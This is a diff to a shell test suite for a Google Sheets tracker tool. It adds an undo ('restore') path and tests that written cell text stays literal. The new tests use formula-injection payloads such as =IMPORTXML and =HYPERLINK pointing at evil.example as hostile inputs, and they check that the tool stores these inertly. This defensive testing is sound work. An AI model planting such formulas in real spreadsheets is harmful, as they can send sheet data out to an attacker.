@@ -100,7 +100,7 @@ text = open(sys.argv[1]).read()
 section = next((b for b in re.split(r"(?m)^## ", text)[1:] if b.startswith("Updating a row in place")), "")
 kinds = []
 for line in section.splitlines():
-    m = re.match(r"\s*bash tracker\.sh update (--preview )?'([^']+)' '([^']+)' '(\{.*?\})'( '(\{.*?\})')?\s*$", line)
+    m = re.match(r"\s*bash tracker\.sh update (--preview |--restore )?'([^']+)' '([^']+)' '(\{.*?\})'( '(\{.*?\})')?\s*$", line)
     if not m:
         if "tracker.sh update" in line and line.lstrip().startswith("bash "):
             print("an update example that is not a well formed call: %s" % line.strip()[:80])
@@ -111,7 +111,8 @@ for line in section.splitlines():
             json.loads(m.group(6))
     except Exception:
         print("unparseable example"); continue
-    kinds.append("preview" if m.group(1) else ("expect" if m.group(6) else "plain"))
+    flag = (m.group(1) or "").strip()
+    kinds.append("preview" if flag == "--preview" else ("restore" if flag == "--restore" and m.group(6) else ("expect" if m.group(6) else "plain")))
     if "claude code" in str(row.get("Skills Used", "")).lower():
         print("an example lists Claude Code under Skills Used")
 print("update-examples=%s" % ",".join(kinds))
@@ -119,7 +120,7 @@ PY
 }
 example_verdict="$(examples_verdict "$DIR/SKILL.md")"
 check "SKILL.md carries a worked append example to judge" "examples=1" "$example_verdict"
-check "SKILL.md's update section shows a preview, then the update bound to what the preview read" "update-examples=preview,expect" "$example_verdict"
+check "SKILL.md's update section shows a preview, the update bound to what the preview read, and the restore that undoes it" "update-examples=preview,expect,restore" "$example_verdict"
 check_not "and no worked example lists Claude Code under Skills Used, which the rule forbids" "Claude Code" "$example_verdict"
 check_not "and every worked example is valid JSON" "unparseable" "$example_verdict"
 check_not "and every update example is a well formed call" "not a well formed call" "$example_verdict"
@@ -128,7 +129,8 @@ check_not "and every update example is a well formed call" "not a well formed ca
 python3 -c 'import sys
 t=open(sys.argv[1]).read(); h=t.index("## Updating a row in place"); s=t[h:]
 s=s.replace("{\"Outcome/Results\"", "{Outcome/Results\"", 1)
-i=s.rindex("\"My Actions\":\"Built login, session"); s=s[:i]+"\"Skills Used\":\"Claude Code\","+s[i:]
+lines=s.split("\n"); k=next(n for n,l in enumerate(lines) if l.startswith("bash tracker.sh update ") and not l.startswith("bash tracker.sh update --"))
+lines[k]=lines[k].replace("{\"Outcome/Results\"", "{\"Skills Used\":\"Claude Code\",\"Outcome/Results\"", 1); s="\n".join(lines)
 print(t[:h]+s, end="")' "$DIR/SKILL.md" > "$TMP/bad-update-examples.md"
 bad_verdict="$(examples_verdict "$TMP/bad-update-examples.md")"
 check "the example check catches a broken update example JSON in that section" "unparseable" "$bad_verdict"
@@ -308,6 +310,18 @@ FAKE_ANSWER='{"ok":true,"action":"update","preview":true,"rowNumber":2}' run upd
 if [ "$RC" -eq 1 ]; then ok; else bad "an update answered as a preview exits 1 (got $RC)"; fi
 check "and says nothing was written" "only a preview" "$OUT"
 check_not "and a real update never asks for a preview" '"preview"' "$(grep '^STDIN:' "$CURL_LOG")"
+
+# --restore: the undo write, sent with restore true, and only with what the cells hold now.
+FAKE_ANSWER='{"ok":true,"action":"update","rowNumber":2}' run update --restore "https://github.com/example/alpha" "Alpha" '{"My Actions":"=SUM(1)"}' '{"My Actions":"x"}'
+check_eq "update --restore with what the cells hold now succeeds" 0 "$RC"
+check "and asks for a restore" '"restore": true' "$(grep '^STDIN:' "$CURL_LOG")"
+check "with the expect it needs" '"expect": {"My Actions": "x"}' "$(grep '^STDIN:' "$CURL_LOG")"
+run update --restore "https://github.com/example/alpha" "Alpha" '{"My Actions":"=SUM(1)"}'
+if [ "$RC" -ne 0 ]; then ok; else bad "update --restore without what the cells hold now exits non zero (got $RC)"; fi
+check_eq "and reaches nothing" 0 "$(curl_calls)"
+check "and says restore needs it" "restore needs" "$OUT"
+FAKE_ANSWER='{"ok":true,"action":"update","rowNumber":2}' run update "https://github.com/example/alpha" "Alpha" '{"My Actions":"x"}' '{"My Actions":"old"}'
+check_not "and an ordinary update never asks for a restore" '"restore"' "$(grep '^STDIN:' "$CURL_LOG")"
 
 # An optional fourth argument is what the preview read; it goes as "expect".
 FAKE_ANSWER='{"ok":true,"action":"update","rowNumber":2}' run update "https://github.com/example/alpha" "Alpha" '{"My Actions":"x"}' '{"My Actions":"old"}'
@@ -496,6 +510,19 @@ const cell = (r, c) => {
   return v;
 };
 const shown = (r, c) => { const v = raw(r, c); return v && typeof v === 'object' ? v.display : String(v); };
+// What Sheets makes of a value written to a cell (setValue, appendRow): a leading apostrophe
+// stores the rest as literal text and is not shown; text starting = + - or @ (other than a plain
+// number) becomes a live formula; date shaped text becomes a date; number shaped text a number.
+function stored(v) {
+  if (typeof v !== 'string') return v;
+  if (v.startsWith("'")) return v.slice(1);
+  const numeric = /^[+-]?\d+(\.\d+)?$/.test(v);
+  if (/^[=+\-@]/.test(v) && !numeric) return { formula: v, value: '#FORMULA', display: '#FORMULA' };
+  const m = v.match(/^(\d{4})-(\d{1,2})-(\d{1,2})$/);
+  if (m) { const d = m[1] + '-' + m[2].padStart(2, '0') + '-' + m[3].padStart(2, '0'); return { date: d + 'T00:00:00.000Z', display: d }; }
+  if (numeric) return Number(v);
+  return v;
+}
 const formulaOf = (r, c) => { const v = raw(r, c); return v && typeof v === 'object' && v.formula ? v.formula : ''; };
 function applyChange(ops) {
   ops.forEach((op) => {
@@ -523,7 +550,7 @@ function range(r, c, nr, nc) {
       if (nr !== 1 || nc !== 1) throw new Error('setValue on a range of more than one cell');
       while (rows.length < r) rows.push([]);
       while (rows[r - 1].length < c) rows[r - 1].push('');
-      rows[r - 1][c - 1] = v;
+      rows[r - 1][c - 1] = stored(v);
       writes.push([r, c, v]);
     },
     setValues(vals) {
@@ -536,7 +563,7 @@ const sheet = {
   getLastRow: () => rows.length,
   getRange: range,
   getDataRange: () => range(1, 1, Math.max(rows.length, 1), Math.max(width(), 1)),
-  appendRow: (r) => { appended.push(r); rows.push(r.slice()); },
+  appendRow: (r) => { appended.push(r); rows.push(r.map(stored)); },
 };
 const ctx = {
   SpreadsheetApp: { getActiveSpreadsheet: () => ({ getSheets: () => [sheet], getSheetByName: () => sheet }), flush: () => {} },
@@ -713,8 +740,8 @@ print("yes" if [pad(r,w) for r in d["rows"]]==[pad(r,w) for r in f] else "no: %s
   check_eq "and names the row it changed" '6' "$(jget "$r" 'd["responses"][1]["rowNumber"]')"
   check_eq "and changes exactly the two named cells, matching a header in any case" \
     '[[6,5,"Did E","Did E and more"],[6,6,"Out E","Shipped"]]' "$(jget "$r" 'd["diffs"][1]')"
-  check_eq "and writes no other cell at all, not even with its own value" \
-    '[[6,5,"Did E and more"],[6,6,"Shipped"]]' "$(jget "$r" 'd["writes"]')"
+  check_eq "and writes no other cell at all, not even with its own value, and each as literal text" \
+    "[[6,5,\"'Did E and more\"],[6,6,\"'Shipped\"]]" "$(jget "$r" 'd["writes"]')"
   check_eq "and every unlisted column keeps its value (empty Date Completed stays empty, When to Check Results and Notes kept)" \
     '["Epsilon","2026-05-01","","Goal E","Did E and more","Shipped","2026-12-15","Bash","https://github.com/example/epsilon","keep me"]' \
     "$(jget "$r" 'd["rows"][5]')"
@@ -757,7 +784,52 @@ print("yes" if [pad(r,w) for r in d["rows"]]==[pad(r,w) for r in f] else "no: %s
   withexp(){ python3 -c 'import json,sys; b=json.loads(sys.argv[1]); b["expect"]=json.loads(sys.argv[2]); print(json.dumps(b))' "$1" "$2"; }
   r="$(gs "$REAL" "$(withexp "$(upd "$REAL" "https://github.com/example/zeta" "Zeta" '{"When to Check Results":"2027-01-01","Skills Used":"Go"}')" \
     '{"When to Check Results":"2026-11-01","skills used":"=CONCAT(\"Type\",\"Script\")"}')" POST "$TMP/sheet-typed.json")"
-  check_eq "update with expect matching what the preview read: writes both cells" '[[6,7,"2027-01-01"],[6,8,"Go"]]' "$(jget "$r" 'd["writes"]')"
+  check_eq "update with expect matching what the preview read: writes both cells" "[[6,7,\"'2027-01-01\"],[6,8,\"'Go\"]]" "$(jget "$r" 'd["writes"]')"
+
+  # Cells are written as literal text by default (#1047 review): #1032 writes text made from
+  # commit subjects, and a subject starting = + - or @ would otherwise become a live formula
+  # (formula injection, IMPORTXML style exfiltration), and date or number shaped text would be
+  # converted. Each stays exactly the text sent, as stored and as shown.
+  HOSTILE='{"My Actions":"=IMPORTXML(\"https://evil.example/\",\"//a\")","Outcome/Results":"2026-1-5","Skills Used":"+SUM(1)","Notes":"@here -x"}'
+  r="$(gs "$REAL" "$(upd "$REAL" "$ALPHA" "Alpha" "$HOSTILE")" POST "$SHEET")"
+  check_eq "update: formula, date and sign led text is stored as the literal text sent, never a formula, date or number" \
+    '["=IMPORTXML(\"https://evil.example/\",\"//a\")","2026-1-5","+SUM(1)","@here -x"]' "$(jget "$r" '[d["rows"][1][i] for i in (4,5,7,9)]')"
+  check_eq "and shown exactly as sent" \
+    '["=IMPORTXML(\"https://evil.example/\",\"//a\")","2026-1-5","+SUM(1)","@here -x"]' "$(jget "$r" '[d["response"]["row"][i] for i in (4,5,7,9)]')"
+  # append had the same exposure: every text value it is given is literal too.
+  r="$(gs "$REAL" "$(python3 -c 'import json,sys; print(json.dumps({"key":sys.argv[1],"data":{"Project Name":"=HYPERLINK(\"https://evil.example\",\"x\")","Date Started":"2026-1-5","Date Completed":"","Problem/Goal":"-1+2","Skills Used":"0042","Link":"@x","When to Check Results":42}}))' "$REAL")" POST "$SHEET")"
+  check_eq "append: formula, date, sign and number shaped text is stored as the literal text sent; a JSON number stays a number" \
+    '["=HYPERLINK(\"https://evil.example\",\"x\")","2026-1-5","","-1+2",42,"0042","@x"]' "$(jget "$r" '[d["rows"][-1][i] for i in (0,1,2,3,6,7,8)]')"
+
+  # restore: the one raw write, for an undo. It puts back exactly what the answer's "restore"
+  # recorded (a formula as a live formula, a date as a date, text as text), and only together with
+  # expect covering every cell it writes, so it can only overwrite the values it is undoing.
+  FIRST="$(upd "$REAL" "https://github.com/example/zeta" "Zeta" '{"When to Check Results":"2027-01-01","Skills Used":"Go","My Actions":"=1+1 typed"}')"
+  UNDO="$(python3 -c 'import json,sys; print(json.dumps({"key":sys.argv[1],"action":"update","link":"https://github.com/example/zeta","projectName":"Zeta","restore":True,
+    "cells":{"When to Check Results":{"date":"2026-11-01"},"Skills Used":{"formula":"=CONCAT(\"Type\",\"Script\")"},"My Actions":"Did Z"},
+    "expect":{"When to Check Results":"2027-01-01","Skills Used":"Go","My Actions":"=1+1 typed"}}))' "$REAL")"
+  r="$(gs "$REAL" "[$FIRST,$UNDO]" POST "$TMP/sheet-typed.json")"
+  check_eq "update: the answer's restore holds what puts each cell back (a formula and a date marked as such, text as text)" \
+    '{"When to Check Results":{"date":"2026-11-01"},"Skills Used":{"formula":"=CONCAT(\"Type\",\"Script\")"},"My Actions":"Did Z"}' "$(jget "$r" 'd["responses"][0].get("restore")')"
+  check_eq "and restoring it succeeds" 'true' "$(jget "$r" 'd["responses"][1].get("ok")')"
+  check_eq "and puts back a live formula, a date and plain text" \
+    '[{"formula":"=CONCAT(\"Type\",\"Script\")"},"2026-11-01","Did Z"]' \
+    "$(jget "$r" '[{"formula": d["rows"][5][7].get("formula")} if isinstance(d["rows"][5][7], dict) else d["rows"][5][7], d["rows"][5][6].get("display") if isinstance(d["rows"][5][6], dict) and "date" in d["rows"][5][6] else d["rows"][5][6], d["rows"][5][4]]')"
+  # Text stays literal even under restore: only a value marked {"formula"} or {"date"} is raw.
+  r="$(gs "$REAL" "$(python3 -c 'import json,sys; print(json.dumps({"key":sys.argv[1],"action":"update","link":"https://github.com/example/alpha","projectName":"Alpha","restore":True,"cells":{"My Actions":"=IMPORTXML(\"https://evil.example/\",\"//a\")"},"expect":{"My Actions":"Did A"}}))' "$REAL")" POST "$SHEET")"
+  check_eq "update: restore still writes plain text as literal text" '"=IMPORTXML(\"https://evil.example/\",\"//a\")"' "$(jget "$r" 'd["rows"][1][4]')"
+  refuses_update "a formula or date value without restore" "restore" \
+    "$(gs "$REAL" "$(upd "$REAL" "$ALPHA" "Alpha" '{"My Actions":{"formula":"=1+1"}}')" POST "$SHEET")"
+  refuses_update "a formula value that is not a formula" "My Actions" \
+    "$(gs "$REAL" "$(python3 -c 'import json,sys; b=json.loads(sys.argv[1]); b["restore"]=True; b["expect"]={"My Actions":"Did A"}; print(json.dumps(b))' "$(upd "$REAL" "$ALPHA" "Alpha" '{"My Actions":{"formula":"1+1"}}')")" POST "$SHEET")"
+  refuses_update "restore without expect" "restore" \
+    "$(gs "$REAL" "$(python3 -c 'import json,sys; b=json.loads(sys.argv[1]); b["restore"]=True; print(json.dumps(b))' "$(upd "$REAL" "$ALPHA" "Alpha" '{"My Actions":"=1+1"}')")" POST "$SHEET")"
+  refuses_update "restore whose expect leaves out a cell it writes" "Outcome/Results" \
+    "$(gs "$REAL" "$(python3 -c 'import json,sys; b=json.loads(sys.argv[1]); b["restore"]=True; b["expect"]={"My Actions":"Did A"}; print(json.dumps(b))' "$(upd "$REAL" "$ALPHA" "Alpha" '{"My Actions":"=1+1","Outcome/Results":"=2+2"}')")" POST "$SHEET")"
+  refuses_update "restore that is not true or false" "restore" \
+    "$(gs "$REAL" "$(python3 -c 'import json,sys; b=json.loads(sys.argv[1]); b["restore"]="yes"; b["expect"]={"My Actions":"Did A"}; print(json.dumps(b))' "$(upd "$REAL" "$ALPHA" "Alpha" '{"My Actions":"=1+1"}')")" POST "$SHEET")"
+  refuses_update "restore over a cell edited since" 'now holds \"Did A\"' \
+    "$(gs "$REAL" "$(python3 -c 'import json,sys; b=json.loads(sys.argv[1]); b["restore"]=True; b["expect"]={"My Actions":"something else"}; print(json.dumps(b))' "$(upd "$REAL" "$ALPHA" "Alpha" '{"My Actions":"=1+1"}')")" POST "$SHEET")"
   refuses_update "a named cell edited since the preview" 'now holds \"Did A\", not \"Did A earlier\"' \
     "$(gs "$REAL" "$(withexp "$(upd "$REAL" "$ALPHA" "Alpha" '{"My Actions":"x","Outcome/Results":"y"}')" '{"My Actions":"Did A earlier","Outcome/Results":"Out A"}')" POST "$SHEET")"
   refuses_update "expect naming a cell the update does not change" "Notes" \
